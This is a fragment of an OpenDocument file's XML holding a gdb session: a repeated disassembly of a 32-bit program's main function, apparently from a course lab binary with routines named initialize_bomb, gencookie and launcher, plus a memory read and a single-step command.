      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fad &lt;+197&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048faf &lt;+199&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x804b1bc</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fb9 &lt;+209&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fbb &lt;+211&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fbd &lt;+213&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fc2 &lt;+218&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a004,0x8(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fca &lt;+226&gt;:<text:tab/>mov <text:s text:c="3"/>%esi,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fce &lt;+230&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd1 &lt;+233&gt;:<text:tab/>call <text:s text:c="2"/>0x8048930 &lt;getopt@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd6 &lt;+238&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd8 &lt;+240&gt;:<text:tab/>cmp <text:s text:c="3"/>$0xff,%al</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fda &lt;+242&gt;:<text:tab/>jne <text:s text:c="3"/>0x8048f54 &lt;main+108&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe0 &lt;+248&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x0,0x804b1b4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe7 &lt;+255&gt;:<text:tab/>jne <text:s text:c="3"/>0x8049002 &lt;main+282&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe9 &lt;+257&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048feb &lt;+259&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fef &lt;+263&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a1e8,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ff6 &lt;+270&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ffb &lt;+275&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ffd &lt;+277&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049002 &lt;+282&gt;:<text:tab/>call <text:s text:c="2"/>0x80492e5 &lt;initialize_bomb&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049007 &lt;+287&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1b4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804900d &lt;+293&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049011 &lt;+297&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a00b,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049018 &lt;+304&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804901d &lt;+309&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1c4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049023 &lt;+315&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049027 &lt;+319&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a017,(%esp)</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804902e &lt;+326&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049033 &lt;+331&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1c4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049039 &lt;+337&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804903c &lt;+340&gt;:<text:tab/>call <text:s text:c="2"/>0x8048990 &lt;srandom@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049041 &lt;+345&gt;:<text:tab/>call <text:s text:c="2"/>0x8048880 &lt;random@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049046 &lt;+350&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049048 &lt;+352&gt;:<text:tab/>and <text:s text:c="3"/>$0xff0,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804904e &lt;+358&gt;:<text:tab/>add <text:s text:c="3"/>$0x100,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049054 &lt;+364&gt;:<text:tab/>movl <text:s text:c="2"/>$0x4,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804905c &lt;+372&gt;:<text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049060 &lt;+376&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049063 &lt;+379&gt;:<text:tab/>call <text:s text:c="2"/>0x80488b0 &lt;calloc@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049068 &lt;+384&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804906a &lt;+386&gt;:<text:tab/>movl <text:s text:c="2"/>$0x0,(%eax)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049070 &lt;+392&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x1,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049075 &lt;+397&gt;:<text:tab/>jle <text:s text:c="3"/>0x80490a3 &lt;main+443&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049077 &lt;+399&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804907c &lt;+404&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,0x14(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049080 &lt;+408&gt;:<text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049084 &lt;+412&gt;:<text:tab/>call <text:s text:c="2"/>0x8048880 &lt;random@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049089 &lt;+417&gt;:<text:tab/>and <text:s text:c="3"/>$0xf0,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804908e &lt;+422&gt;:<text:tab/>mov <text:s text:c="3"/>$0x80,%edx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049093 &lt;+427&gt;:<text:tab/>sub <text:s text:c="3"/>%eax,%edx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049095 &lt;+429&gt;:<text:tab/>mov <text:s text:c="3"/>%edx,(%esi,%ebx,4)</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049098 &lt;+432&gt;:<text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909b &lt;+435&gt;:<text:tab/>cmp <text:s text:c="3"/>%edi,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909d &lt;+437&gt;:<text:tab/>jl <text:s text:c="4"/>0x8049084 &lt;main+412&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909f &lt;+439&gt;:<text:tab/>mov <text:s text:c="3"/>0x14(%esp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490a3 &lt;+443&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x0,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490a8 &lt;+448&gt;:<text:tab/>jle <text:s text:c="3"/>0x80490cd &lt;main+485&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490aa &lt;+450&gt;:<text:tab/>mov <text:s text:c="3"/>$0x0,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490af &lt;+455&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b1 &lt;+457&gt;:<text:tab/>add <text:s text:c="3"/>(%esi,%ebx,4),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b4 &lt;+460&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard">=&gt; 0x080490b8 &lt;+464&gt;:<text:tab/>mov <text:s text:c="3"/>0x18(%esp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490bc &lt;+468&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490bf &lt;+471&gt;:<text:tab/>call <text:s text:c="2"/>0x8048e17 &lt;launcher&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490c4 &lt;+476&gt;:<text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490c7 &lt;+479&gt;:<text:tab/>cmp <text:s text:c="3"/>0x1c(%esp),%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490cb &lt;+483&gt;:<text:tab/>jl <text:s text:c="4"/>0x80490af &lt;main+455&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490cd &lt;+485&gt;:<text:tab/>mov <text:s text:c="3"/>$0x0,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d2 &lt;+490&gt;:<text:tab/>add <text:s text:c="3"/>$0x24,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d5 &lt;+493&gt;:<text:tab/>pop <text:s text:c="3"/>%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d6 &lt;+494&gt;:<text:tab/>pop <text:s text:c="3"/>%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d7 &lt;+495&gt;:<text:tab/>pop <text:s text:c="3"/>%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d8 &lt;+496&gt;:<text:tab/>mov <text:s text:c="3"/>%ebp,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490da &lt;+498&gt;:<text:tab/>pop <text:s text:c="3"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490db &lt;+499&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x $esp+0x18</text:p>
      <text:p text:style-name="Standard">0xbffff0c8:<text:tab/>0x00000001</text:p>
      <text:p text:style-name="Standard">(gdb) nexti</text:p>
      <text:p text:style-name="Standard">0x080490bc in main ()</text:p>
      <text:p text:style-name="Standard">(gdb) disas</text:p>
      <text:p text:style-name="Standard">Dump of assembler code for function main:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ee8 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ee9 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eeb &lt;+3&gt;:<text:tab/>and <text:s text:c="3"/>$0xfffffff0,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eee &lt;+6&gt;:<text:tab/>push <text:s text:c="2"/>%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eef &lt;+7&gt;:<text:tab/>push <text:s text:c="2"/>%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef0 &lt;+8&gt;:<text:tab/>push <text:s text:c="2"/>%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef1 &lt;+9&gt;:<text:tab/>sub <text:s text:c="3"/>$0x24,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef4 &lt;+12&gt;:<text:tab/>mov <text:s text:c="3"/>0x8(%ebp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef7 &lt;+15&gt;:<text:tab/>mov <text:s text:c="3"/>0xc(%ebp),%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048efa &lt;+18&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048b7c,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f02 &lt;+26&gt;:<text:tab/>movl <text:s text:c="2"/>$0xb,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f09 &lt;+33&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f0e &lt;+38&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048ba6,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f16 &lt;+46&gt;:<text:tab/>movl <text:s text:c="2"/>$0x7,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f1d &lt;+53&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f22 &lt;+58&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048b52,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f2a &lt;+66&gt;:<text:tab/>movl <text:s text:c="2"/>$0x4,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f31 &lt;+73&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f36 &lt;+78&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1a4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f3c &lt;+84&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x804b1c0</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f42 &lt;+90&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f4a &lt;+98&gt;:<text:tab/>movl <text:s text:c="2"/>$0x0,0x18(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f52 &lt;+106&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f54 &lt;+108&gt;:<text:tab/>sub <text:s text:c="3"/>$0x67,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f57 &lt;+111&gt;:<text:tab/>cmp <text:s text:c="3"/>$0xe,%bl</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5a &lt;+114&gt;:<text:tab/>ja <text:s text:c="4"/>0x8048fbb &lt;main+211&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5c &lt;+116&gt;:<text:tab/>movzbl %bl,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5f &lt;+119&gt;:<text:tab/>jmp <text:s text:c="3"/>*0x804a25c(,%ebx,4)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f66 &lt;+126&gt;:<text:tab/>movl <text:s text:c="2"/>$0x5,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f6e &lt;+134&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x18(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f76 &lt;+142&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f78 &lt;+144&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f7a &lt;+146&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f7f &lt;+151&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f81 &lt;+153&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1a8,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f87 &lt;+159&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f8a &lt;+162&gt;:<text:tab/>call <text:s text:c="2"/>0x8048a20 &lt;__strdup@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f8f &lt;+167&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x804b1b4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f94 &lt;+172&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f97 &lt;+175&gt;:<text:tab/>call <text:s text:c="2"/>0x8049e4d &lt;gencookie&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f9c &lt;+180&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x804b1c4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fa1 &lt;+185&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fa3 &lt;+187&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x804b1b8</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fad &lt;+197&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048faf &lt;+199&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x804b1bc</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fb9 &lt;+209&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fbb &lt;+211&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fbd &lt;+213&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fc2 &lt;+218&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a004,0x8(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fca &lt;+226&gt;:<text:tab/>mov <text:s text:c="3"/>%esi,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fce &lt;+230&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd1 &lt;+233&gt;:<text:tab/>call <text:s text:c="2"/>0x8048930 &lt;getopt@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd6 &lt;+238&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd8 &lt;+240&gt;:<text:tab/>cmp <text:s text:c="3"/>$0xff,%al</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fda &lt;+242&gt;:<text:tab/>jne <text:s text:c="3"/>0x8048f54 &lt;main+108&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe0 &lt;+248&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x0,0x804b1b4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe7 &lt;+255&gt;:<text:tab/>jne <text:s text:c="3"/>0x8049002 &lt;main+282&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe9 &lt;+257&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048feb &lt;+259&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fef &lt;+263&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a1e8,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ff6 &lt;+270&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ffb &lt;+275&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ffd &lt;+277&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049002 &lt;+282&gt;:<text:tab/>call <text:s text:c="2"/>0x80492e5 &lt;initialize_bomb&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049007 &lt;+287&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1b4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804900d &lt;+293&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049011 &lt;+297&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a00b,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049018 &lt;+304&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804901d &lt;+309&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1c4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049023 &lt;+315&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049027 &lt;+319&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a017,(%esp)</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804902e &lt;+326&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049033 &lt;+331&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1c4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049039 &lt;+337&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804903c &lt;+340&gt;:<text:tab/>call <text:s text:c="2"/>0x8048990 &lt;srandom@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049041 &lt;+345&gt;:<text:tab/>call <text:s text:c="2"/>0x8048880 &lt;random@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049046 &lt;+350&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049048 &lt;+352&gt;:<text:tab/>and <text:s text:c="3"/>$0xff0,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804904e &lt;+358&gt;:<text:tab/>add <text:s text:c="3"/>$0x100,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049054 &lt;+364&gt;:<text:tab/>movl <text:s text:c="2"/>$0x4,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804905c &lt;+372&gt;:<text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049060 &lt;+376&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049063 &lt;+379&gt;:<text:tab/>call <text:s text:c="2"/>0x80488b0 &lt;calloc@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049068 &lt;+384&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804906a &lt;+386&gt;:<text:tab/>movl <text:s text:c="2"/>$0x0,(%eax)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049070 &lt;+392&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x1,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049075 &lt;+397&gt;:<text:tab/>jle <text:s text:c="3"/>0x80490a3 &lt;main+443&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049077 &lt;+399&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804907c &lt;+404&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,0x14(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049080 &lt;+408&gt;:<text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049084 &lt;+412&gt;:<text:tab/>call <text:s text:c="2"/>0x8048880 &lt;random@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049089 &lt;+417&gt;:<text:tab/>and <text:s text:c="3"/>$0xf0,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804908e &lt;+422&gt;:<text:tab/>mov <text:s text:c="3"/>$0x80,%edx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049093 &lt;+427&gt;:<text:tab/>sub <text:s text:c="3"/>%eax,%edx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049095 &lt;+429&gt;:<text:tab/>mov <text:s text:c="3"/>%edx,(%esi,%ebx,4)</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
